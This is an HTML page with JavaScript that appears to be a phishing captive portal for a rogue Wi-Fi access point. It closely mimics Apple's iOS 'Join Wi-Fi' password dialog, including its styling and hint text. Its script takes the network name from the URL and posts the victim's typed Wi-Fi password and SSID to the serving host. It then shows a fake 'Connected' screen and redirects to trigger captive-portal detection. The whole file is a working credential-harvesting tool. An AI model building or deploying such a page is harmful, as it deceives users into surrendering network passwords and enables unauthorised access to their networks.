<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to network</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
        }

        body {
            background: #1c1c1e;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 24px 10px;
        }

        .icon-btn {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: #3a3a3c;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 18px;
        }

        .wifi-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 30px 24px 20px;
        }

        .wifi-icon svg {
            width: 80px;
            height: 60px;
        }

        .network-info {
            width: 100%;
            padding: 24px 24px 0;
        }

        .network-name {
            font-size: 28px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
        }

        .network-desc {
            font-size: 17px;
            color: #8e8e93;
            line-height: 1.4;
        }

        .form-section {
            padding: 32px 24px 0;
        }

        .password-field {
            width: 100%;
            padding: 16px 18px;
            background: #2c2c2e;
            border: none;
            border-radius: 14px;
            font-size: 17px;
            color: #fff;
            outline: none;
        }

        .password-field::placeholder {
            color: #636366;
        }

        .hint-text {
            margin-top: 12px;
            font-size: 13px;
            color: #636366;
            line-height: 1.5;
            padding: 0 4px;
        }

        .error-msg {
            color: #ff453a;
            font-size: 14px;
            margin-top: 12px;
            display: none;
            padding: 0 4px;
        }

        .error-msg.show {
            display: block;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <button class="icon-btn" onclick="history.back()">✕</button>
        <button class="icon-btn" id="joinBtn">✓</button>
    </div>

    <div class="wifi-section">
        <div class="wifi-icon">
            <svg viewBox="0 0 100 75" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M50 60 C50 60 50 60 50 60" stroke="#1a8fe3" stroke-width="8" stroke-linecap="round"/>
                <path d="M35 46 Q50 38 65 46" stroke="#1a8fe3" stroke-width="7" stroke-linecap="round" fill="none"/>
                <path d="M20 32 Q50 16 80 32" stroke="#1a8fe3" stroke-width="7" stroke-linecap="round" fill="none"/>
                <path d="M5 18 Q50 -4 95 18" stroke="#1a8fe3" stroke-width="7" stroke-linecap="round" fill="none"/>
                <circle cx="50" cy="62" r="5" fill="#1a8fe3"/>
            </svg>
        </div>
    </div>

    <div class="network-info">
        <div class="network-name" id="ssidTitle">Join "Wi-Fi"</div>
        <div class="network-desc">Enter the password to join this Wi‑Fi network.</div>
    </div>

    <div class="form-section">
        <form id="loginForm" method="POST" action="/">
            <input type="password" class="password-field" name="password" id="password"
                placeholder="Password" required autocomplete="current-password">
            <div class="error-msg" id="errorMsg">Incorrect password. Try again.</div>
            <p class="hint-text">You can also access this Wi‑Fi network by bringing your iPhone near any iPhone, iPad, or Mac which has connected to this network and has you in their contacts.</p>
        </form>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const ssid = urlParams.get('ssid') || 'NETWORK';
        document.getElementById('ssidTitle').textContent = 'Join \u201c' + ssid + '\u201d';

        document.getElementById('joinBtn').addEventListener('click', function () {
            const password = document.getElementById('password').value;
            if (!password) return;

            fetch('/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'password=' + encodeURIComponent(password) + '&ssid=' + encodeURIComponent(ssid)
            })
            .then(r => r.text())
            .then(html => {
                if (html.includes('Connected') || html.includes('checkmark')) {
                    // Show brief success, then trigger captive portal detection
                    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#34C759;color:white;font-family:-apple-system,sans-serif;font-size:24px;">✓ Connected</div>';
                    setTimeout(() => { window.location.href = '/generate_204'; }, 1000);
                } else {
                    document.getElementById('errorMsg').classList.add('show');
                }
            })
            .catch(() => {
                document.getElementById('errorMsg').classList.add('show');
            });
        });
    </script>
</body>
</html>
